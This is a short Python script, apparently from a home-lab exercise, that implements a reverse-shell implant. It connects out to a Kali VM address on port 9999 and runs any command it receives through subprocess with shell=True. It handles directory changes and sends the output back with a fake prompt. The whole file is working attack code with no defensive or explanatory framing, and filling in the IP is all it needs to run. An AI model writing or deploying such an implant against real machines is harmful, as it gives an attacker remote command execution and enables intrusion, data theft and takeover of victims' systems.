# implant_client_v2.py
import socket
import subprocess
import os

def start_implant():
    # REPLACE THIS with your Kali VM IP Address!
    host = '192.168.1.XX' 
    port = 9999

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        client_socket.connect((host, port))
    except Exception as e:
        print(f"Connection failed: {e}")
        return

    while True:
        data = client_socket.recv(1024).decode()
        
        # 1. Handle CD command (Special Case)
        if data.startswith('cd '):
            try:
                # Extract the path after "cd "
                path = data[3:].strip()
                os.chdir(path)
                client_socket.send(f"Changed directory to {os.getcwd()}".encode())
            except Exception as e:
                client_socket.send(str(e).encode())
            continue

        # 2. Handle Terminate
        if 'terminate' in data:
            break
        
        # 3. Handle Normal Commands
        if len(data) > 0:
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = output_bytes.decode(errors='ignore') # 'ignore' prevents crashing on weird characters
            
            # Send back current directory + output to make it look like a real shell
            current_dir = os.getcwd() + "> "
            full_reply = output_str + "\n" + current_dir
            client_socket.send(full_reply.encode())

    client_socket.close()

if __name__ == '__main__':
    start_implant()
